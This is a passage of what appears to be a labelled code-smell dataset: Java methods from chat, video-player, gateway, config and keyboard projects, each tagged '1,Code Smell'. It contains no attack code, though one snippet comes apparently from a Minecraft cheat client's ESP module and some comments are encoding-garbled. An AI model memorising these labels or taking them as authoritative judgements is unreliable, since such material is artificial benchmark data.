      otherSeg1=otherSeg2;
      if (intersection == null)       continue;
      intersection[0]+=tOffset;
      intersection[1]+=uOffset;
      intersections.add(intersection);
    }
    seg1=seg2;
  }
  return intersections;
}",1,Code Smell
"private void refreshUI(TUIMessageBean msg,int position){
  if (!(msg instanceof TextMessageBean)) {
    return;
  }
  if (hasRiskContent) {
    setRiskContent(itemView.getResources().getString(com.tencent.qcloud.tuikit.tuichat.R.string.chat_risk_send_message_failed_alert));
  }
  TextMessageBean textMessageBean=(TextMessageBean)msg;
  if (isForwardMode || isReplyDetailMode || !textMessageBean.isSelf()) {
    int otherTextColorResId=TUIThemeManager.getAttrResId(msgBodyText.getContext(),com.tencent.qcloud.tuikit.tuichat.R.attr.chat_other_msg_text_color);
    int otherTextColor=msgBodyText.getResources().getColor(otherTextColorResId);
    msgBodyText.setTextColor(otherTextColor);
  }
 else {
    int selfTextColorResId=TUIThemeManager.getAttrResId(msgBodyText.getContext(),com.tencent.qcloud.tuikit.tuichat.R.attr.chat_self_msg_text_color);
    int selfTextColor=msgBodyText.getResources().getColor(selfTextColorResId);
    msgBodyText.setTextColor(selfTextColor);
  }
  msgBodyText.setVisibility(View.VISIBLE);
  applyCustomConfig();
  msgArea.setOnLongClickListener(new View.OnLongClickListener(){
    @Override public boolean onLongClick(    View v){
      if (selectionHelper != null) {
        selectionHelper.selectAll();
      }
      return true;
    }
  }
);
  if (textMessageBean.getText() != null) {
    FaceManager.handlerEmojiText(msgBodyText,textMessageBean.getText(),false);
  }
 else   if (!TextUtils.isEmpty(textMessageBean.getExtra())) {
    FaceManager.handlerEmojiText(msgBodyText,textMessageBean.getExtra(),false);
  }
 else {
    FaceManager.handlerEmojiText(msgBodyText,TUIChatService.getAppContext().getString(com.tencent.qcloud.tuikit.tuichat.R.string.no_support_msg),false);
  }
  if (isForwardMode || isReplyDetailMode) {
    return;
  }
  setSelectionHelper(msg,msgBodyText,position);
}
",1,Code Smell
"protected void clickPoster(){
  if (jzDataSource == null || jzDataSource.urlsMap.isEmpty() || jzDataSource.getCurrentUrl() == null) {
    Toast.makeText(jzvdContext,getResources().getString(R.string.no_url),Toast.LENGTH_SHORT).show();
    return;
  }
  if (state == STATE_NORMAL) {
    if (!jzDataSource.getCurrentUrl().toString().startsWith(""file"") && !jzDataSource.getCurrentUrl().toString().startsWith(""/"") && !JZUtils.isWifiConnected(jzvdContext)&& !WIFI_TIP_DIALOG_SHOWED) {
      showWifiDialog();
      return;
    }
    startVideo();
  }
 else   if (state == STATE_AUTO_COMPLETE) {
    onClickUiToggle();
  }
}
",1,Code Smell
"private static InvocationExprent isAssertionError(Statement stat){
  if (stat == null || stat.getExprents() == null || stat.getExprents().size() != 1) {
    return null;
  }
  Exprent expr=stat.getExprents().get(0);
  if (expr.type == Exprent.EXPRENT_EXIT) {
    ExitExprent exexpr=(ExitExprent)expr;
    if (exexpr.getExitType() == ExitExprent.EXIT_THROW && exexpr.getValue().type == Exprent.EXPRENT_NEW) {
      NewExprent nexpr=(NewExprent)exexpr.getValue();
      if (CLASS_ASSERTION_ERROR.equals(nexpr.getNewType()) && nexpr.getConstructor() != null) {
        return nexpr.getConstructor();
      }
    }
  }
  return null;
}",1,Code Smell
"public void onError(int what,int extra){
  Log.e(TAG,""onError "" + what + "" - ""+ extra+ "" [""+ this.hashCode()+ ""] "");
  if (what != 38 && extra != -38 && what != -38 && extra != 38 && extra != -19) {
    onStateError();
    mediaInterface.release();
  }
}",1,Code Smell
"@Override public Mono<Void> filter(final ServerWebExchange exchange,GatewayFilterChain chain){
  SecurityFrameworkUtils.removeLoginUser(exchange);
  String token=SecurityFrameworkUtils.obtainAuthorization(exchange);
  if (StrUtil.isEmpty(token)) {
    return chain.filter(exchange);
  }
  return getLoginUser(exchange,token).defaultIfEmpty(LOGIN_USER_EMPTY).flatMap(user -> {
    if (user == LOGIN_USER_EMPTY || user.getExpiresTime() == null || LocalDateTimeUtils.beforeNow(user.getExpiresTime())) {
      return chain.filter(exchange);
    }
    SecurityFrameworkUtils.setLoginUser(exchange,user);
    ServerWebExchange newExchange=exchange.mutate().request(builder -> SecurityFrameworkUtils.setLoginUserHeader(builder,user)).build();
    return chain.filter(newExchange);
  }
);
}
",1,Code Smell
"@SuppressWarnings(""PMD.AvoidLiteralsInIfCondition"") private static List<DatabricksMountpoint> getDatabricksMountpoints(){
  Class dbutilsClass;
  try {
    dbutilsClass=Class.forName(""com.databricks.dbutils_v1.impl.DbfsUtilsImpl"");
  }
 catch (  ClassNotFoundException|NoClassDefFoundError e) {
    log.warn(""Class com.databricks.dbutils_v1.impl.DbfsUtilsImpl not found"",e);
    return Collections.emptyList();
  }
  Constructor[] dbutilsConstructors=dbutilsClass.getDeclaredConstructors();
  if (dbutilsConstructors.length == 0) {
    log.warn(""Failed to load dbutils in OpenLineageListener as there were no declared constructors"");
    return Collections.emptyList();
  }
  Constructor firstConstructor=dbutilsConstructors[0];
  Parameter[] constructorParams=firstConstructor.getParameters();
  Object dbfsUtils;
  if (constructorParams.length == 0) {
    log.debug(""DbUtils constructor had no parameters"");
    try {
      dbfsUtils=firstConstructor.newInstance();
    }
 catch (    InstantiationException|IllegalAccessException|InvocationTargetException e) {
      log.warn(""DbUtils method thrown {}"",e);
      return Collections.emptyList();
    }
  }
 else   if (constructorParams.length == 1 && ""allowMountOperations"".equals(constructorParams[0].getName())) {
    log.debug(""DbUtils constructor had one parameter named allowMountOperations"");
    try {
      dbfsUtils=firstConstructor.newInstance(true);
    }
 catch (    InstantiationException|IllegalAccessException|InvocationTargetException e) {
      log.warn(""DbUtils method thrown {}"",e);
      return Collections.emptyList();
    }
  }
 else {
    log.warn(""dbutils had {} constructors and the first constructor had {} params"",dbutilsConstructors.length,constructorParams.length);
    return Collections.emptyList();
  }
  List<DatabricksMountpoint> mountpoints=new ArrayList<>();
  List<Object> mountsList=ScalaConversionUtils.fromSeq((Seq<Object>)ReflectionUtils.tryExecuteMethod(dbfsUtils,""mounts"").get());
  for (  Object mount : mountsList) {
    Optional<Object> mountPoint=ReflectionUtils.tryExecuteMethod(mount,""mountPoint"");
    Optional<Object> source=ReflectionUtils.tryExecuteMethod(mount,""source"");
    if (mountPoint.isPresent() && mountPoint.get() != null && source.isPresent() && source.get() != null) {
      mountpoints.add(new DatabricksMountpoint(mountPoint.get().toString(),source.get().toString()));
    }
 else {
      log.warn(""Couldn't extract mountPoint and source through reflection. "" + ""mountPoint = {}, source = {}"",mountPoint,source);
    }
  }
  return mountpoints;
}",1,Code Smell
"public static String getRevokeMessageDisplayString(TUIMessageBean msg){
  Context context=TUIChatService.getAppContext();
  if (context == null || msg == null || msg.getStatus() != TUIMessageBean.MSG_STATUS_REVOKE) {
    return """";
  }
  String showString;
  String revoker=msg.getSender();
  String messageSender=msg.getSender();
  UserBean revokerBean=msg.getRevoker();
  if (revokerBean != null && !TextUtils.isEmpty(revokerBean.getUserId())) {
    revoker=revokerBean.getUserId();
  }
  if (TextUtils.equals(revoker,messageSender)) {
    if (msg.isSelf()) {
      showString=context.getResources().getString(R.string.revoke_tips_you);
    }
 else {
      if (!msg.isGroup()) {
        showString=context.getResources().getString(R.string.revoke_tips_other);
      }
 else {
        String operatorName=msg.getUserDisplayName();
        showString=operatorName + context.getResources().getString(R.string.revoke_tips);
      }
    }
  }
 else {
    String operatorName=revokerBean.getDisplayName();
    showString=operatorName + context.getResources().getString(R.string.revoke_tips);
  }
  return showString;
}
",1,Code Smell
"@ModifyReturnValue(method=""isInvisibleTo(Lnet/minecraft/entity/player/PlayerEntity;)Z"",at=@At(""RETURN"")) private boolean isInvisibleToCanceller(boolean original){
  if (!Utils.canUpdate())   return original;
  ESP esp=Modules.get().get(ESP.class);
  if (Modules.get().get(NoRender.class).noInvisibility() || esp.isActive() && !esp.shouldSkip((Entity)(Object)this))   return false;
  return original;
}
",1,Code Smell
"public static int findXMaxOverlapping(List<PointEntity> points,int startIndex,int newEndIndex,int xt2,double wAvg){
  int result=startIndex;
  for (int j=startIndex + 1; j <= newEndIndex; j++) {
    PointEntity pt=points.get(j);
    int w=pt.getWidth();
    double whRadio=pt.getWhRadio();
    int xt1=pt.getxLeft();
    int offset=1;
    if (xt1 - xt2 <= 3 && whRadio < 0.598 && w < wAvg && wAvg > 3.98 * (xt1 - xt2)) {
      offset=2;
    }
    if (xt1 > xt2 + offset) {
      break;
    }
    int rtx2=pt.getxRight();
    xt2=Math.max(rtx2,xt2);
    result=j;
  }
  return result;
}",1,Code Smell
"private void filterNewMessage(ProtoMessage protoMessage){
  if (protoMessage.getContent().getType() == ContentType_Mark_Unread_Sync && userId != null && userId.equals(protoMessage.getFrom())) {
    Message msg=convertProtoMessage(protoMessage);
    MarkUnreadMessageContent content=(MarkUnreadMessageContent)msg.content;
    ProtoLogic.setLastReceivedMessageUnRead(msg.conversation.type.getValue(),msg.conversation.target,msg.conversation.line,content.getMessageUid(),content.getTimestamp());
  }
}
",1,Code Smell
"@Override public void visitAnyClass(Clazz clazz){
  if (invocationOpcode == Instruction.OP_INVOKEVIRTUAL) {
    Clazz superClass=clazz.getSuperClass();
    if (superClass != null) {
      superClass.accept(this);
      if (generalizedClass == null && (superClass.getAccessFlags() & AccessConstants.PUBLIC) != 0 && (superClass.getProcessingFlags() & ProcessingFlags.IS_CLASS_AVAILABLE) != 0) {
        Method method=superClass.findMethod(memberName,memberType);
        if (method != null && (method.getAccessFlags() & AccessConstants.PUBLIC) != 0) {
          generalizedClass=superClass;
          generalizedMember=method;
        }
      }
    }
  }
 else {
    Field field=clazz.findField(memberName,memberType);
    if (field != null && (clazz.getProcessingFlags() & ProcessingFlags.IS_CLASS_AVAILABLE) != 0) {
      generalizedClass=clazz;
      generalizedMember=field;
    }
 else {
      Clazz superClass=clazz.getSuperClass();
      if (superClass != null) {
        superClass.accept(this);
      }
    }
  }
}",1,Code Smell
"/** 
 * Handle a non-separator.
 * @param event The event to handle.
 * @param settingsValues The current settings values.
 * @param inputTransaction The transaction in progress.
 */
private void handleNonSeparatorEvent(final Event event,final SettingsValues settingsValues,final InputTransaction inputTransaction){
  final int codePoint=event.getMCodePoint();
  boolean isComposingWord=mWordComposer.isComposingWord();
  if (SpaceState.PHANTOM == inputTransaction.getMSpaceState() && !settingsValues.isWordConnector(codePoint)) {
    if (isComposingWord) {
      throw new RuntimeException(""Should not be composing here"");
    }
    insertAutomaticSpaceIfOptionsAndTextAllow(settingsValues);
  }
  if (mWordComposer.isCursorFrontOrMiddleOfComposingWord()) {
    unlearnWord(mWordComposer.getTypedWord(),inputTransaction.getMSettingsValues(),Constants.EVENT_BACKSPACE);
    resetEntireInputState(mConnection.getExpectedSelectionStart(),mConnection.getExpectedSelectionEnd(),true);
    isComposingWord=false;
  }
  if (!isComposingWord && settingsValues.isWordCodePoint(codePoint) && settingsValues.needsToLookupSuggestions()&& (!settingsValues.mSpacingAndPunctuations.mCurrentLanguageHasSpaces || !mConnection.isCursorTouchingWord(settingsValues.mSpacingAndPunctuations,!mConnection.hasSlowInputConnection()))) {
    isComposingWord=!settingsValues.mSpacingAndPunctuations.isWordConnector(codePoint);
    resetComposingState(false);
  }
  if (isComposingWord) {
    mWordComposer.applyProcessedEvent(event);
    if (mWordComposer.isSingleLetter()) {
      mWordComposer.setCapitalizedModeAtStartComposingTime(inputTransaction.getMShiftState());
    }
    setComposingTextInternal(getTextWithUnderline(mWordComposer.getTypedWord()),1);
  }
 else {
    final boolean swapWeakSpace=tryStripSpaceAndReturnWhetherShouldSwapInstead(event,inputTransaction);
    if (swapWeakSpace && trySwapSwapperAndSpace(event,inputTransaction)) {
      mSpaceState=SpaceState.WEAK;
    }
 else {
      sendKeyCodePoint(settingsValues,codePoint);
    }
  }
  inputTransaction.setRequiresUpdateSuggestions();
}",1,Code Smell
"/** 
 * 杩斿洖cache鐨刴d5銆傞浂闀垮害瀛楃涓茶〃绀烘病鏈夎鏁版嵁銆�
 */
static public String getContentMd5(String groupKey){
  CacheItem item=CACHE.get(groupKey);
  return (null != item) ? item.md5 : Constants.NULL;
}
static public String getContentMd5(String groupKey,String ip,String tag){
  CacheItem item=CACHE.get(groupKey);
  if (item != null && item.isBeta) {
    if (item.ips4Beta.contains(ip)) {
      return item.md54Beta;
    }
  }
  if (item != null && item.tagMd5 != null && item.tagMd5.size() > 0) {
    if (StringUtils.isNotBlank(tag) && item.tagMd5.containsKey(tag)) {
      return item.tagMd5.get(tag);
    }
  }
  return (null != item) ? item.md5 : Constants.NULL;
}",1,Code Smell
"@SuppressLint(""MissingPermission"") @Override public void onReceive(Context context,Intent intent){
  if (getContext() != null)   getContext().unregisterReceiver(downloadCompletionReceiver);
  boolean successful=false;
  if (DownloadManager.ACTION_DOWNLOAD_COMPLETE.equals(intent.getAction()) && intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID,-1) == downloadID) {
    try (Cursor downloadData=downloadManager.query(new DownloadManager.Query().setFilterById(downloadID))){
      downloadData.moveToFirst();
      int uriColIndex=downloadData.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);
      File downloadedFile=new File(URI.create(downloadData.getString(uriColIndex)));
      if (downloadedFile.exists()) {
        downloadedFilePath=new File(URI.create(downloadData.getString(uriColIndex))).getAbsolutePath();
        notifyInstall();
        successful=true;
      }
    }
 catch (    Throwable ignored) {
    }
  }
  if (!successful) {
    NotificationCompat.Builder builder=new NotificationCompat.Builder(requireContext(),UPDATES_CHANNEL_ID).setSmallIcon(R.drawable.ic_notification_foreground).setContentTitle(requireContext().getText(R.string.download_failed)).setContentText(requireContext().getText(R.string.try_again_later)).setPriority(NotificationCompat.PRIORITY_DEFAULT);
    NotificationManagerCompat.from(requireContext()).notify(2,builder.build());
  }
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  return new TreeVisitor<Tree,ExecutionContext>(){
    @Override public Tree postVisit(    Tree tree,    ExecutionContext ctx){
      return tree.getMarkers().findFirst(ParseExceptionResult.class).map(exceptionResult -> {
        if (parserType != null && !Objects.equals(exceptionResult.getParserType(),parserType)) {
          return tree;
        }
        if (stackTrace != null && !exceptionResult.getMessage().contains(stackTrace)) {
          return tree;
        }
        String snippet=tree instanceof SourceFile ? null : tree.printTrimmed(getCursor());
        if (snippet != null && maxSnippetLength != null && snippet.length() > maxSnippetLength) {
          snippet=snippet.substring(0,maxSnippetLength);
        }
        failures.insertRow(ctx,new ParseFailures.Row(exceptionResult.getParserType(),(tree instanceof SourceFile ? (SourceFile)tree : getCursor().firstEnclosingOrThrow(SourceFile.class)).getSourcePath().toString(),exceptionResult.getExceptionType(),exceptionResult.getTreeType(),snippet,exceptionResult.getMessage()));
        return Markup.info(tree,exceptionResult.getMessage());
      }
).orElse(tree);
    }
  }
;
}",1,Code Smell
"public boolean isSystemLocaleSameAsLocaleOfAllEnabledSubtypesOfEnabledImes(){
  final Locale systemLocale=mContext.getResources().getConfiguration().locale;
  final Set<InputMethodSubtype> enabledSubtypesOfEnabledImes=new HashSet<>();
  final InputMethodManager inputMethodManager=getInputMethodManager();
  final List<InputMethodInfo> enabledInputMethodInfoList=inputMethodManager.getEnabledInputMethodList();
  for (  final InputMethodInfo info : enabledInputMethodInfoList) {
    final List<InputMethodSubtype> enabledSubtypes=inputMethodManager.getEnabledInputMethodSubtypeList(info,true);
    if (enabledSubtypes.isEmpty()) {
      return false;
    }
    enabledSubtypesOfEnabledImes.addAll(enabledSubtypes);
  }
  for (  final InputMethodSubtype subtype : enabledSubtypesOfEnabledImes) {
    if (!subtype.isAuxiliary() && !subtype.getLocale().isEmpty() && !systemLocale.equals(SubtypeLocaleUtils.getSubtypeLocale(subtype))) {
      return false;
    }
  }
  return true;
}
",1,Code Smell
"@Nullable public static ArgumentQueryResult findEligibleArgument(@NotNull CommandSender sender,@NotNull Command command,String[] args,String commandString,boolean trailingSpace,boolean forceCorrect,Predicate<CommandSyntax> syntaxPredicate,Predicate<Argument<?>> argumentPredicate){
  final Collection<CommandSyntax> syntaxes=command.getSyntaxes();
  Int2ObjectRBTreeMap<ArgumentQueryResult> suggestions=new Int2ObjectRBTreeMap<>(Collections.reverseOrder());
  for (  CommandSyntax syntax : syntaxes) {
    if (!syntaxPredicate.test(syntax)) {
      continue;
    }
    final CommandContext context=new CommandContext(commandString);
    final Argument<?>[] commandArguments=syntax.getArguments();
    int inputIndex=0;
    ArgumentQueryResult maxArg=null;
    int maxArgIndex=0;
    for (int argIndex=0; argIndex < commandArguments.length; argIndex++) {
      Argument<?> argument=commandArguments[argIndex];
      ArgumentParser.ArgumentResult argumentResult=validate(sender,argument,commandArguments,argIndex,args,inputIndex);
      if (argumentResult == null) {
        argumentResult=new ArgumentParser.ArgumentResult();
        argumentResult.argument=argument;
        argumentResult.correct=false;
        argumentResult.inputIndex=inputIndex;
        argumentResult.rawArg="""";
      }
      inputIndex=argumentResult.inputIndex;
      if (argumentResult.correct) {
        context.setArg(argument.getId(),argumentResult.parsedValue,argumentResult.rawArg);
      }
      if ((!forceCorrect || argumentResult.correct) && argumentPredicate.test(argument)) {
        maxArg=new ArgumentQueryResult(syntax,argument,context,argumentResult.rawArg);
        maxArgIndex=argIndex;
      }
      if (!argumentResult.correct) {
        break;
      }
      final boolean isLast=inputIndex == args.length;
      if (isLast && !trailingSpace) {
        break;
      }
    }
    if (maxArg != null) {
      suggestions.put(maxArgIndex,maxArg);
    }
  }
  if (suggestions.isEmpty()) {
    return null;
  }
  final int max=suggestions.firstIntKey();
  return suggestions.get(max);
}",1,Code Smell
"@Override public DataFetcher<?> instrumentDataFetcher(DataFetcher<?> dataFetcher,InstrumentationFieldFetchParameters parameters,InstrumentationState rawState){
  Graphql20OpenTelemetryInstrumentationState state=ofState(rawState);
  return environment -> {
    ResultPath path=environment.getExecutionStepInfo().getPath();
    Context parentContext=state.getParentContextForPath(path);
    if (!dataFetcherInstrumenter.shouldStart(parentContext,environment) || (parameters.isTrivialDataFetcher() && !createSpansForTrivialDataFetcher)) {
      try (Scope ignored=parentContext.makeCurrent()){
        return dataFetcher.get(environment);
      }
     }
    Context childContext=dataFetcherInstrumenter.start(parentContext,environment);
    state.setContextForPath(path,childContext);
    boolean isCompletionStage=false;
    try (Scope ignored=childContext.makeCurrent()){
      Object fieldValue=dataFetcher.get(environment);
      isCompletionStage=fieldValue instanceof CompletionStage;
      if (isCompletionStage) {
        return ((CompletionStage<?>)fieldValue).whenComplete((result,throwable) -> dataFetcherInstrumenter.end(childContext,environment,null,throwable));
      }
      return fieldValue;
    }
 catch (    Throwable throwable) {
      dataFetcherInstrumenter.end(childContext,environment,null,throwable);
      throw throwable;
    }
 finally {
      if (!isCompletionStage) {
        dataFetcherInstrumenter.end(childContext,environment,null,null);
      }
    }
  }
;
}",1,Code Smell
"@Override public void onActivityResult(int requestCode,int resultCode,@Nullable @org.jetbrains.annotations.Nullable Intent data){
  super.onActivityResult(requestCode,resultCode,data);
  if (requestCode == Params.REQUEST_CODE_CHOOSE && resultCode == RESULT_OK && data != null) {
    try {
      Uri uri=data.getData();
      String fileString=new String(UriUtils.uri2Bytes(uri));
      boolean restoreResult=BackupUtils.restoreBackups(mContext,fileString);
      Common.showToast(restoreResult ? getString(R.string.restore_success) : getString(R.string.restore_failed));
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
}",1,Code Smell
"/** 
 * 淇濊瘉涓嶈繑鍥濶ULL
 * @return serverlist
 */
private List<String> getApacheServerList(){
  if (STANDALONE_MODE) {
    List<String> serverIps=new ArrayList<String>();
    serverIps.add(getFormatServerAddr(LOCAL_IP));
    return serverIps;
  }
  try {
    List<String> serverIps=new ArrayList<String>();
    List<String> serverAddrLines=readClusterConf();
    if (!CollectionUtils.isEmpty(serverAddrLines)) {
      for (      String serverAddr : serverAddrLines) {
        if (StringUtils.isNotBlank(serverAddr.trim())) {
          serverIps.add(getFormatServerAddr(serverAddr));
        }
      }
    }
    if (serverIps.size() > 0) {
      return serverIps;
    }
  }
 catch (  Exception e) {
    defaultLog.error(""nacos-XXXX"",""[serverlist] failed to get serverlist from disk!"",e);
  }
  if (isUseAddressServer()) {
    try {
      HttpResult result=NotifyService.invokeURL(addressServerUrl,null,null);
      if (HttpServletResponse.SC_OK == result.code) {
        isAddressServerHealth=true;
        addressServerFailCcount=0;
        List<String> lines=IOUtils.readLines(new StringReader(result.content));
        List<String> ips=new ArrayList<String>(lines.size());
        for (        String serverAddr : lines) {
          if (StringUtils.isNotBlank(serverAddr)) {
            ips.add(getFormatServerAddr(serverAddr));
          }
        }
        return ips;
      }
 else {
        addressServerFailCcount++;
        if (addressServerFailCcount >= maxFailCount) {
          isAddressServerHealth=false;
        }
        defaultLog.error(""[serverlist] failed to get serverlist, error code {}"",result.code);
        return Collections.emptyList();
      }
    }
 catch (    IOException e) {
      addressServerFailCcount++;
      if (addressServerFailCcount >= maxFailCount) {
        isAddressServerHealth=false;
      }
      defaultLog.error(""[serverlist] exception, "" + e.toString(),e);
      return Collections.emptyList();
    }
  }
 else {
    List<String> serverIps=new ArrayList<String>();
    serverIps.add(getFormatServerAddr(LOCAL_IP));
    return serverIps;
  }
}",1,Code Smell
"public static boolean isConnected(BlockState state,BlockState other,Direction pDirection){
  state=state.setValue(WATERLOGGED,false).setValue(POWERED,false);
  other=other.setValue(WATERLOGGED,false).setValue(POWERED,false);
  boolean open=state.getValue(OPEN);
  Half half=state.getValue(HALF);
  Direction facing=state.getValue(FACING);
  if (open != other.getValue(OPEN))   return false;
  if (!open && half == other.getValue(HALF))   return pDirection.getAxis() != Axis.Y;
  if (!open && half != other.getValue(HALF) && pDirection.getAxis() == Axis.Y)   return true;
  if (open && facing.getOpposite() == other.getValue(FACING) && pDirection.getAxis() == facing.getAxis())   return true;
  if ((open ? state.setValue(HALF,Half.TOP) : state) != (open ? other.setValue(HALF,Half.TOP) : other))   return false;
  return pDirection.getAxis() != facing.getAxis();
}
",1,Code Smell
"/** 
 * Returns the API level corresponding to the given magic number, or  {@code -1} if the given array is not a well-formed dex filemagic number.
 * @param magic array of bytes containing DEX file magic string
 * @return API level corresponding to magic string if valid, -1 otherwise.
 */
public static int magicToApi(byte[] magic){
  if (magic.length != 8) {
    return -1;
  }
  if ((magic[0] != 'd') || (magic[1] != 'e') || (magic[2] != 'x')|| (magic[3] != '\n')|| (magic[7] != '\0')) {
    return -1;
  }
  String version="""" + ((char)magic[4]) + ((char)magic[5])+ ((char)magic[6]);
  if (version.equals(VERSION_FOR_API_13)) {
    return API_NO_EXTENDED_OPCODES;
  }
 else   if (version.equals(VERSION_FOR_API_24)) {
    return API_DEFINE_INTERFACE_METHODS;
  }
 else   if (version.equals(VERSION_FOR_API_26)) {
    return API_METHOD_HANDLES;
  }
 else   if (version.equals(VERSION_FOR_API_28)) {
    return API_CONST_METHOD_HANDLE;
  }
 else   if (version.equals(VERSION_CURRENT)) {
    return API_CURRENT;
  }
  return -1;
}",1,Code Smell
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  ignoreLayout=true;
  int width=MeasureSpec.getSize(widthMeasureSpec);
  int height=MeasureSpec.getSize(heightMeasureSpec);
  setMeasuredDimension(width,height);
  float bitmapW;
  float bitmapH;
  int fullHeight=AndroidUtilities.displaySize.y - ActionBar.getCurrentActionBarHeight() - getAdditionalTop()- getAdditionalBottom();
  int maxHeight=fullHeight - dp(48);
  if (bitmapToEdit != null) {
    bitmapW=bitmapToEdit.getWidth();
    bitmapH=bitmapToEdit.getHeight();
  }
 else {
    bitmapW=width;
    bitmapH=height - ActionBar.getCurrentActionBarHeight() - dp(48);
  }
  float renderWidth=width;
  float renderHeight=(float)Math.floor(renderWidth * bitmapH / bitmapW);
  if (renderHeight > maxHeight) {
    renderHeight=maxHeight;
    renderWidth=(float)Math.floor(renderHeight * bitmapW / bitmapH);
  }
  renderView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  renderInputView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  baseScale=renderWidth / paintingSize.width;
  entitiesView.setScaleX(baseScale);
  entitiesView.setScaleY(baseScale);
  entitiesView.measure(MeasureSpec.makeMeasureSpec((int)paintingSize.width,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)paintingSize.height,MeasureSpec.EXACTLY));
  if (thanosEffect != null) {
    thanosEffect.measure(MeasureSpec.makeMeasureSpec((int)paintingSize.width,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)paintingSize.height,MeasureSpec.EXACTLY));
    thanosEffect.setScaleX(baseScale);
    thanosEffect.setScaleY(baseScale);
  }
  updateEntitiesSelections();
  selectionContainerView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  measureChild(bottomLayout,widthMeasureSpec,heightMeasureSpec);
  measureChild(weightChooserView,widthMeasureSpec,heightMeasureSpec);
  measureChild(pipetteContainerLayout,widthMeasureSpec,heightMeasureSpec);
  int keyboardPad=Math.max(getPKeyboardHeight(),emojiPadding);
  measureChild(overlayLayout,widthMeasureSpec,MeasureSpec.makeMeasureSpec(height - keyboardPad,MeasureSpec.EXACTLY));
  topLayout.setPadding(topLayout.getPaddingLeft(),dp(12) + AndroidUtilities.statusBarHeight,topLayout.getPaddingRight(),topLayout.getPaddingBottom());
  measureChild(topLayout,widthMeasureSpec,heightMeasureSpec);
  ignoreLayout=false;
  int keyboardSize=0;
  if (!waitingForKeyboardOpen && keyboardSize <= dp(20) && !emojiViewVisible && !isAnimatePopupClosing) {
    ignoreLayout=true;
    hideEmojiView();
    ignoreLayout=false;
  }
  if (keyboardSize <= dp(20)) {
  }
 else {
    hideEmojiView();
  }
  if (emojiView != null) {
    measureChild(emojiView,widthMeasureSpec,heightMeasureSpec);
  }
}",1,Code Smell
"/** 
 * check updater
 * @return - true if updated
 */
public boolean checkAndUpdateHolder(){
  if (fileChanged.compareAndSet(true,false) || (configFile != null && configFile.lastModified() != this.lastModifyTime)) {
    long startTime=System.currentTimeMillis();
    if (loadFromFileToHolder()) {
      boolean initialized=(this.lastModifyTime != 0L);
      if (configFile != null) {
        this.lastModifyTime=configFile.lastModified();
      }
      if (initialized) {
        LOG.info(""File {} has changed, reload from local file, wast {} ms"",this.fileName,(System.currentTimeMillis() - startTime));
      }
 else {
        LOG.info(""File {} has imported, reload from local file, wast {} ms"",this.fileName,(System.currentTimeMillis() - startTime));
      }
      return true;
    }
    LOG.warn(""File {} has changed, but reload content failure"",this.fileName);
  }
  return false;
}",1,Code Smell
"/** 
 * 普通窗口下亮度、音量、播放进度的调节功能
 * @param event
 */
private void moveChange(MotionEvent event){
  if (screen == SCREEN_NORMAL || screen == SCREEN_FULLSCREEN) {
    float x=event.getX();
    float y=event.getY();
    float deltaX=x - mDownX;
    float deltaY=y - mDownY;
    float absDeltaX=Math.abs(deltaX);
    float absDeltaY=Math.abs(deltaY);
    if (!mChangePosition && !mChangeVolume && !mChangeBrightness) {
      if (absDeltaX > THRESHOLD || absDeltaY > THRESHOLD) {
        cancelProgressTimer();
        if (absDeltaX >= THRESHOLD) {
          if (state != STATE_ERROR) {
            mChangePosition=true;
            mGestureDownPosition=getCurrentPositionWhenPlaying();
          }
        }
 else {
          if (mDownX < mScreenWidth * 0.5f) {
            mChangeBrightness=true;
            WindowManager.LayoutParams lp=JZUtils.getWindow(getContext()).getAttributes();
            if (lp.screenBrightness < 0) {
              try {
                mGestureDownBrightness=Settings.System.getInt(getContext().getContentResolver(),Settings.System.SCREEN_BRIGHTNESS);
                Log.i(TAG,""current system brightness: "" + mGestureDownBrightness);
              }
 catch (              Settings.SettingNotFoundException e) {
                e.printStackTrace();
              }
            }
 else {
              mGestureDownBrightness=lp.screenBrightness * 255;
              Log.i(TAG,""current activity brightness: "" + mGestureDownBrightness);
            }
          }
 else {
            mChangeVolume=true;
            mGestureDownVolume=mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
          }
        }
      }
    }
  }
}",1,Code Smell
"private char[] getPassword(){
  char[] password=cachedCredentialProvider.getCachedPassword();
  if (password == null && (this.info.getPassword() != null && this.info.getPassword().length() > 0)) {
    password=this.info.getPassword().toCharArray();
  }
  return password;
}",1,Code Smell
"private void updateType(){
  String type=""Legacy"";
  if (headersForm.getTransaction().isSegwit() || (headersForm.getPsbt() != null && headersForm.getPsbt().getPsbtInputs().stream().anyMatch(in -> in.getWitnessUtxo() != null))) {
    type=""Segwit"";
  }
  segwit.setText(type);
}
",1,Code Smell
"/** 
 * Adds a user.
 * @param context the specified context
 */
public void addUser(final RequestContext context){
  final Request request=context.getRequest();
  final String userName=context.param(User.USER_NAME);
  final String email=context.param(User.USER_EMAIL);
  final String password=context.param(User.USER_PASSWORD);
  final String appRole=context.param(UserExt.USER_APP_ROLE);
  final boolean nameInvalid=UserRegisterValidationMidware.invalidUserName(userName);
  final boolean emailInvalid=!Strings.isEmail(email);
  final boolean passwordInvalid=UserRegister2ValidationMidware.invalidUserPassword(password);
  if (nameInvalid || emailInvalid || passwordInvalid) {
    final AbstractFreeMarkerRenderer renderer=new SkinRenderer(context,""admin/error.ftl"");
    final Map<String,Object> dataModel=renderer.getDataModel();
    if (nameInvalid) {
      dataModel.put(Keys.MSG,langPropsService.get(""invalidUserNameLabel""));
    }
 else     if (emailInvalid) {
      dataModel.put(Keys.MSG,langPropsService.get(""invalidEmailLabel""));
    }
 else     if (passwordInvalid) {
      dataModel.put(Keys.MSG,langPropsService.get(""invalidPasswordLabel""));
